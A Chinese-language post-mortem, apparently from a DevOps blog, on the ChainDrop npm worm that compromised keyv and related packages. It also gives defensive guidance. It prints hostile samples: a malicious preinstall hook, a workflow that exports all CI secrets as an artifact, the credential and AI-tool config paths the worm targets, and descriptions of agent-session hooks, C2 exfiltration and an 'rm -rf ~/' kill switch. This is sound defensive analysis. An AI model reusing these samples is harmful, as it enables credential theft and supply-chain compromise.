---
title: "ChainDrop npm 蠕虫复盘：keyv 投毒、20 亿月下载量沦陷，而所有「供应链安全」控件都失灵了"
date: 2026-08-28
tags:
  - npm
  - supply-chain
  - security
  - devops
  - chaindrop
  - shai-hulud
  - keyv
  - ci-cd
keywords:
  - ChainDrop
  - npm 供应链攻击
  - keyv 投毒
  - Shai-Hulud
  - 软件供应链安全
  - CI/CD 安全
  - 依赖投毒
  - 凭证窃取
category: devops
description: "2026-08-04 ChainDrop 蠕虫通过劫持 keyv 维护者账号，在 4 小时内污染 444 个包、2212 个版本、波及 20 亿月下载量。本文拆解完整攻击链，并解释为什么 SLSA 签名、npm audit、--ignore-scripts 这次全部失灵——以及后端工程师真正该做的防御。"
recommend: DevOps
---

# ChainDrop npm 蠕虫复盘：keyv 投毒、20 亿月下载量沦陷，而所有「供应链安全」控件都失灵了

2026 年 8 月 4 日（UTC），一个名为 **ChainDrop** 的自传播 npm 蠕虫横扫了整个 npm 生态。它在 **不到 4 小时**内污染了 **444 个包、2212 个版本**（StepSecurity 08-04 18:10 统计），波及 **keyv、flat-cache、file-entry-cache、cacheable** 等总计 **超过 20 亿次月下载量**的包。后续其它厂商口径在「400–868 个包 / 1381–2212 个版本」之间浮动——但无论取哪个数字，这都是 Shai-Hulud 家族迄今规模最大的一波。

更值得每一个后端工程师警惕的，不是「又有一个包被投毒」，而是：**这次几乎所有你以为能挡住投毒的控件——SLSA 签名、Sigstore 证明、npm audit、CI 扫描——全部「正常通过」了**。攻击者拿的是货真价实的维护者账号，跑的是包自己合法的 GitHub Actions 流水线，签出来的是验签通过的发布物。

这篇文章复盘完整攻击链，并给出一份**不那么天真**的防御清单。

---

## 一、攻击链拆解

### 1.1 起点：维护者 GitHub 账号被盗

攻击者劫持了 `keyv` / `cacheable` 生态维护者的 GitHub 账号（TOTP 类 2FA 被实时钓鱼绕过）。随后直接把两个恶意文件推到各仓库的 `main` 分支，并修改 `package.json`：

```json
{
  "scripts": {
    "preinstall": "node setup.mjs"
  }
}
```

因为攻击者是「合法维护者」，仓库既有的 GitHub Actions 发布流水线被自动触发，**用合法身份把带毒版本构建并发布到 npm，附带有效的 SLSA Build L3 证明与 Sigstore 签名**。这直接埋下了「签名验证全部通过」的伏笔。

最初的 11 个「投毒载体」（carrier）如下，注意它们都是 `cacheable` 这一个 monorepo 家族的成员：

| 包 | 恶意版本 | 干净版本 |
|---|---|---|
| `keyv` | 6.0.0 | 5.6.0 |
| `flat-cache` | 6.1.24 | 6.1.23 |
| `file-entry-cache` | 11.1.6 | 11.1.5 |
| `cacheable-request` | 13.0.20 | 13.0.19 |
| `cacheable` | 2.5.1 | 2.5.0 |
| `@cacheable/memory` | 2.2.1 | 2.2.0 |
| `cache-manager` | 7.2.10 | 7.2.9 |
| `@cacheable/node-cache` | 3.1.2 | 3.1.1 |
| `@cacheable/utils` | 2.5.1 | 2.5.0 |
| `@cacheable/net` | 2.1.1 | 2.1.0 |
| `ecto` | 5.0.1 | 5.0.0 |

### 1.2 投毒载荷：preinstall 钩子 + Bun + Math_Symbol.js

`preinstall` 钩子会执行 `setup.mjs`：它从官方 GitHub Releases 下载 **Bun 运行时**（域名就是 `github.com` 本身，传统域名信誉拦截完全无效），再用 Bun 跑一个 **约 710–727KB 的重度混淆载荷 `Math_Symbol.js`**。

传播出去的第二代包里，混淆载荷改名叫 `math_init.js`（SHA-256 与 `Math_Symbol.js` 相同，文件名只是「代际」标记）。关键 IOC：

```
setup.mjs (原版)        SHA-256  54dc7ea54a1317cca0e890a2770630cf7fa6c97813e0cb9d2caa93012b350668
setup.mjs (社区传播版)   SHA-256  fd3ca4007b225fdf8de7af4345a19179d5efa8c4bb9205f88cda806e5684b1eb
Math_Symbol.js / math_init.js  SHA-256  9fc2570b7cef51c1b8df116d144d11ff4096357be7d2c4c6367cfc2509cf1bcc
```

### 1.3 凭证收割：300+ 模式、140 路径，AI 工具凭证成新目标

载荷内置一个覆盖 **300+ 正则、140 个路径**的扫描器，从本机与环境里拖走一切能找到的凭据：

- npm token（`~/.npmrc`、`NPM_TOKEN`、CI runner 上下文）
- GitHub（PAT、`GITHUB_TOKEN`、从 runner 内存里抠出的 OIDC token）
- AWS（`~/.aws/credentials`、IMDS/ECS 元数据、环境变量）
- GCP / Azure（服务账号文件、环境变量）
- Kubernetes（`~/.kube/config`、SA token）
- HashiCorp Vault（`VAULT_TOKEN`）、SSH 私钥、`.env`、`.netrc`、Docker config、Terraform state、Jenkins 凭据、比特币/Electrum 钱包

**本代最显著的变化**：它把 **AI 编码工具凭据**列为一级目标，专门扫描：

```
.claude/credentials.json
.claude.json
.codex/auth.json
.cursor/credentials.json
.openai/auth.json
.anthropic/auth.json
.gemini/.env
.config/opencode/opencode.json
.openclaw/openclaw.json
.hermes/.env
.kiro/settings/mcp.json
```

并且在 Linux CI runner 上，载荷里的内嵌 Python 助手会直接 `open("/proc/<Runner.Worker pid>/mem")` 读 GitHub Actions runner 的**实时内存**，grep 出 `"isSecret":true` 的字段——这些凭据**从不出现在日志里**，常规日志脱敏完全抓不到。

### 1.4 自传播：偷 npm token → 重打包 → 重发布

拿到一个具备 `publish` 权限且 `bypass_2fa: true` 的 npm token 后，蠕虫会：

1. 向 npm registry 枚举该 token 能写的所有包；
2. 下载每个包的最新 tarball，解包到临时目录；
3. 注入 `setup.mjs` + `math_init.js`，给 `package.json` 加 `preinstall` 钩子；
4. patch 版本号 +1（如 `1.2.3 → 1.2.4`）；
5. **重新打包并发布回 npm**。

这就是「一个账号被盗 → 跨组织自动扩散」的机制。受害者的包很多**根本没有对应 git commit / PR / tag**，纯粹是攻击者用偷来的 token 直接改了 registry 上的 tarball——你只查 `main` 分支有没有变，是查不出来的。

更阴的是另一条 **OIDC 可信发布**路径：蠕虫不碰 npm token，而是向 runner 申请 audience 为 `npm:registry.npmjs.org` 的 OIDC token，在 npm 自己的可信发布交换端点换成真实发布凭据；顺手再申请 `sigstore` 的 OIDC，拿 Fulcio 证书、自签 in-toto SLSA v1 证明、写进 Rekor 透明日志。**于是重发布的版本照样带有效 provenance。**

### 1.5 持久化：把钩子写进 `.claude/` 和 `.vscode/`

蠕虫用 GraphQL 把下面两组文件推到受害者**每一个可写分支**（最多 50 个分支/仓库），提交作者伪装成 `claude@users.noreply.github.com`，提交信息统一为 `chore: update config`：

```text
.vscode/tasks.json      → folderOpen 任务，打开仓库即执行 node .vscode/setup.mjs
.claude/settings.json   → SessionStart 钩子，启动 Claude Code 会话即执行 node .claude/setup.mjs
```

两个钩子互相交叉引用对方的 loader，所以**无论你先开编辑器还是先起 AI agent，都会触发**。这意味着：清掉 `node_modules` 没用，**只要有人 clone 并打开这个仓库，就再次感染**。

它还会塞一个 `Run Copilot` 工作流（`on: push`，唯一动作是把 GitHub Actions 的全量 secrets 序列化写进 `format-results.txt` 并作为 artifact 上传，再删掉分支和 run 掩盖痕迹）：

```yaml
name: Run Copilot
on: push
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(secrets) }}' > format-results.txt
      - uses: actions/upload-artifact@v4
        with:
          name: format-results
          path: format-results.txt
```

这是把**根本不进日志的组织级密钥**洗成可下载 artifact 的经典手法。

### 1.6 C2 藏在以太坊合约里

ChainDrop 的 C2 地址**不硬编码**——它通过 `eth_call` 查询主网合约 `0xE1f2395ee43e45A1556EC6438a88c31B83493103`（selector `0x53ed5143`），依次尝试 75 个公共 RPC 端点，从返回值里解出当前 C2 域名列表。攻击者**改一条链上交易就能轮换 C2**，域名黑名单永远慢半拍。

外联域名（观测到）：`npm-cache[.]com`、`pypi-get[.]com`、`js-mirror[.]com`。数据经 `gzip → AES-256-GCM（随机密钥）→ RSA-OAEP-SHA256 包一层 → base64` 后 POST 到 `https://npm-cache[.]com:443/router`。C2 响应里若带 `code` 字段，蠕虫会用 `eval(...)` 执行——这是**活的反向远控**，不是一次性窃密。

### 1.7 死亡开关：吊销 token 反而触发 `rm -rf ~/`

蠕虫安装一个驻留守护进程 `gh-token-monitor`（在 `~/.local/bin/gh-token-monitor.sh` + systemd user service 或 macOS LaunchAgent），每 60 秒用偷来的 GitHub token 轮询 API。一旦 token 失效（返回 4xx，即你吊销了它），就触发**破坏性载荷**——其中一个变体直接 `rm -rf ~/`。

**所以正确的止血顺序是：先清掉 IDE 钩子和死亡开关，再从干净机器上吊销 token。** 反过来（先吊销）等于亲自按下自毁按钮。

---

## 二、为什么 SLSA 签名、npm audit、`--ignore-scripts` 全失效

这是本事件最该被记住的一课。

**1）签名与 provenance 证明的是「构建来源」，不是「代码被审过」。**
攻击者持有合法维护者账号，仓库自己的流水线构建、Sigstore 签名、SLSA 证明一条不少——所有验签控件全部「通过」。Provenance 说「这个包确实来自它声称的仓库和流水线」，但它**完全不保证**那次构建的源码是人类审阅过的。能堵住这一点的，是**分支保护 + 发布前强制 review**，而不是签名本身。

**2）`npm audit` 是滞后指标。**
它比对的是已知漏洞数据库，而一个新投毒包要等公开披露、入库之后才会被标记——通常是攻击开始后数小时到数天。ChainDrop 在 4 小时内就跑完了，那段时间里 `npm audit` 全是绿的。

**3）`--ignore-scripts` 只挡 install 时执行，挡不住「打开仓库即执行」。**
`.vscode/tasks.json` 和 `.claude/settings.json` 的钩子根本不经由 npm。你为了排查而用 VS Code 打开被投毒的仓库——钩子当场就跑了。同理，本期还有 AsyncAPI / Miasma 一类载荷是 `require()` 时触发，连 `postinstall` 都不用，`--ignore-scripts` 对它们形同虚设。

**结论**：这些控件都有价值，但单独任何一个都救不了你。**「验证身份 + 验证构建来源」在「账号本身被攻陷」时全面破产**——信任链的薄弱点回到了开发者账号，而它只靠一个可被钓鱼的 TOTP。

---

## 三、受影响的包与干净版本对照

如果你维护的项目直接或间接依赖下面任意一个包，请立刻核对 lockfile 里解析到的**精确版本**（不是 registry 的 `latest` 标签，因为当时很多包的 `latest` 在数小时内仍指向恶意版本）：

```bash
# 列出解析到的版本，逐条比对上表
npm ls keyv cacheable flat-cache file-entry-cache cacheable-request cache-manager --all

# 看某个版本的发布时间，对照 2026-08-04 09:35 UTC 起的暴露窗口
npm view keyv time --json
```

> 注意：`keyv@6.0.0` 曾是 `latest`，**不要**假设 `^` 范围安全。建议用 `overrides` 显式钉死：

```json
{
  "overrides": {
    "keyv": "5.6.0",
    "flat-cache": "6.1.23",
    "file-entry-cache": "11.1.5"
  }
}
```

---

## 四、后端工程师真正该做的防御

按「投入产出比」排序。

### 4.1 默认关掉 install 脚本（npm 12 已默认，老版本手动开）

`preinstall` / `postinstall` 是绝大多数 npm 恶意包的交付通道。npm **12（2026-07-08 发布）已默认阻止依赖的生命周期脚本**，需要用 `allowScripts` 策略逐个放行。老版本：

```bash
# 全局（CI runner 上必做）
npm config set ignore-scripts true

# 或单次安装
npm install --ignore-scripts
```

CI 里更建议**写进 `.npmrc` 并提交进仓库**，让策略随代码走、可被 review：

```ini
# ./.npmrc —— 可安全提交
engine-strict=true
ignore-scripts=true
save-exact=true
audit-level=high
```

> ⚠️ npm 配置有 6 层优先级：CLI flag > `NPM_CONFIG_*` 环境变量 > 项目 `.npmrc` > 用户 `~/.npmrc` > 全局 npmrc > 内置。一个 `export NPM_CONFIG_IGNORE_SCRIPTS=false` 就能悄悄把你提交的策略覆盖掉。**认证令牌永远不要写进 `.npmrc`**，用 `${NPM_TOKEN}` 占位、值从环境变量注入。

少数确实需要构建脚本的原生包（如 `esbuild`、`sharp`、`bcrypt`），用 `@lavamoat/allow-scripts` 把放行名单钉死在 `package.json` 里，扩展名单要走 code-owner review。

### 4.2 锁文件审计 + `npm ci`

永远别在 CI / Docker build 里跑 `npm install`——它会「好心」帮你改 lockfile，而这正是攻击者发恶意 patch 时指望的行为。改用：

```bash
npm ci        # 严格按 lockfile 安装；package.json 与 lockfile 不一致直接失败
```

再用 `lockfile-lint` 在 CI 里卡一道（验证每个 `resolved` 都指向 `registry.npmjs.org` 且带 `sha512` 完整性哈希）：

```bash
npx lockfile-lint --path package-lock.json \
  --allowed-hosts npm --validate-https --validate-integrity
```

发生活跃事件时，**别只信 `npm audit`**。直接把 lockfile 里解析到的版本发布时间与厂商 IOC 列表（Socket / Wiz / Aikido 通常在数小时内放出）做交叉比对。

### 4.3 用 OIDC 可信发布替代长期 token

如果你自己发 npm 包，把 CI 里长期躺着的 `NPM_TOKEN` 换掉，改用 CI 平台按工作流运行**临时签发的 OIDC token**（npm CLI ≥ 11.5.1，工作流需 `id-token: write`，全程不出现 `NODE_AUTH_TOKEN`）。没有长期凭据可偷，这一类凭证窃取攻击直接失去目标。消费侧则可以 `npm audit signatures` 校验发布物签名（防御纵深，但记住它对「攻击者控制流水线签的名」无效）。

### 4.4 分支保护 + 发布前强制 review

这是 keyv 事件里**唯一能拦下初始投毒**的控件——可惜 keyv 的发布分支没有强制 review，攻击者作为合法维护者直接 push 到 `main` 就触发了流水线。对你自己的仓库：

- 发布分支开启 **required review**；
- 发布动作走 **protected environment** + 审批；
- 监控「无对应 PR/commit 却出现的新 patch 版本」这类异常发布行为（离群小时发布、批量发版）。

### 4.5 CI runner 出口白名单（egress allowlist）

无论触发点是 `postinstall` 还是 `require()`，载荷最终都要去网络拉第二阶段。默认拒绝（default-deny）的出口策略能在**不知道包有毒**的窗口里直接掐断它：只允许 registry、git host、内部缓存的域名解析与连通，IPFS 网关和裸 C2 IP 自然不在名单里。这一步与包/生命周期无关，trigger-agnostic。

### 4.6 信任发布冷却期 + 私有代理

- **发布冷却**：Renovate 设 `minimumReleaseAge: "7 days"`，或 pnpm `minimumReleaseAge`（v11 默认 1 天，建议调到 14 天）。让新版本在「野外」活过一周再进你的构建——这恰好跨过大多数投毒的暴露窗口。
- **私有代理**：在公网 registry 前放 Verdaccio / Artifactory，开启「不可变缓存」（一旦代理拉过 `pkg@x.y.z` 就锁死字节，上游改动或 unpublish 都不影响你）和「新包首次拉取审计日志」。对外网 outage 和供应链篡改是双重免疫。

### 4.7 把 AI 工具配置当成可执行代码

`.claude/`、` .cursor/`、`.vscode/`、`.gemini/` 下的 `settings.json` / `tasks.json` / `hooks` 现在会**直接拿到开发者本机身份与凭据**。把它们纳入 review 范围，和源码同等对待；在 CI 里扫描仓库是否被人塞了 `SessionStart` / `folderOpen` 类钩子。

### 4.8 维护者账号上 FIDO2 / Passkey

TOTP 类 2FA 在实时钓鱼面前形同虚设。npm 维护者账号强制 **passkey / 安全密钥**（不可钓鱼），是堵住「初始账号被盗」这一最薄弱环的最低成本投入。

---

## 五、如果你可能已经中招：止血清单

按**正确顺序**操作——先清钩子与死亡开关，**再**吊销。

```bash
# ① 先查并移除死亡开关（在任何吊销操作之前）
ls -la ~/.config/gh-token-monitor/ ~/.local/bin/gh-token-monitor.sh 2>/dev/null
launchctl list 2>/dev/null | grep -i gh-token-monitor                 # macOS
systemctl --user list-unit-files 2>/dev/null | grep -i gh-token-monitor # Linux

# ② 查仓库里被植入的 IDE / agent 钩子（node_modules 干净也没用）
#    重点看 .claude/settings.json  .vscode/tasks.json  .codex/hooks.json  .devcontainer/

# ③ 从一台干净机器上，按类别「吊销」而非仅轮换：
npm token list && npm token revoke <id>          # npm 发布 token
# GitHub PAT / OAuth：Settings → Developer settings
# 云：~/.aws/credentials  ~/.config/gcloud/  Azure CLI 凭据
# Vault / K8s SA token、SSH 私钥、AI 提供商 key（含 .claude/.codex/.cursor/.openai/.anthropic/.gemini）
```

然后：把依赖降到上一个干净版本并钉死 → 用干净 lockfile 跑 `npm ci` → 清缓存（`npm cache clean --force`、pnpm store、CI 镜像里的缓存/镜像/tarball——**只回退 latest 标签不够，锁文件、缓存、镜像、tarball 都还留着毒**）→ 用 OSV-Scanner / Socket 复扫确认无 `MALICIOUS` → 重建 CI 黄金镜像。

---

## 六、小结

ChainDrop 把「可信构建基础设施」本身武器化了：它劫持合法维护者账号，让包自己的流水线签出带毒发布；用偷来的 token 做机器速度的跨组织自传播；把持久化埋进 AI 编码工具配置；C2 躲在以太坊合约里随时轮换；还用一个死亡开关惩罚「过早吊销 token」的响应动作。

它暴露的不是某个工具的失败，而是当前供应链信任模型的**结构性盲区**：验证能确认身份与构建来源，可身份本身会被攻陷。签名、provenance、SBOM 都很重要，但**当攻击者控制源仓库时它们毫无意义**。真正能拉低爆炸半径的，是分层纵深——关掉 install 脚本、锁文件审计、`npm ci`、OIDC 短期凭据、CI 出口白名单、发布冷却、passkey，以及把 IDE/agent 配置当成代码来审。

防御供应链蠕虫，没有银弹，只有「让攻击者同时绕过所有层」变得足够难。

---

## 参考

- StepSecurity — [ChainDrop npm Worm: Bun-loaded CI/CD credential stealer](https://www.stepsecurity.io/blog/chaindrop-npm-worm)
- Microsoft Security — [ChainDrop supply chain compromise: anatomy of a self-propagating worm](https://www.microsoft.com/en-us/security/blog/2026/08/04/chaindrop-supply-chain-compromise-anatomy-self-propagating-worm/)
- Unit 42 (Palo Alto) — [ChainDrop: Inside a Self-Propagating npm Worm](https://unit42.paloaltonetworks.com/chaindrop-npm-worm-analysis/)
- Elastic Security Labs — [Shai-Hulud strikes again: CHAINDROP worm hits 400+ packages](https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain)
- Zscaler ThreatLabz — [Tracking Shai-Hulud: Inside the ChainDrop npm worm](https://www.zscaler.com/blogs/security-research/tracking-shai-hulud-inside-chaindrop-npm-worm)
- Aikido — [Keyv and friends compromised in npm supply chain attack](https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack)
- Pillar Security — [ChainDrop: When Opening a Repository Becomes Execution](https://www.pillar.security/blog/chaindrop-when-opening-a-repository-becomes-execution)
- Leitwacht — [Why --ignore-scripts didn't stop the AsyncAPI npm compromise](https://leitwacht.eu/blog/why-ignore-scripts-didnt-stop-asyncapi)
- jlevy/supply-chain-hardening — [hardening-npm.md](https://github.com/jlevy/supply-chain-hardening/blob/main/guidelines/hardening-npm.md)
- Subresource Integrity — [Registry & Package Manager Hardening](https://www.subresource-integrity.com/supply-chain-auditing-dependency-verification/registry-package-manager-hardening/)
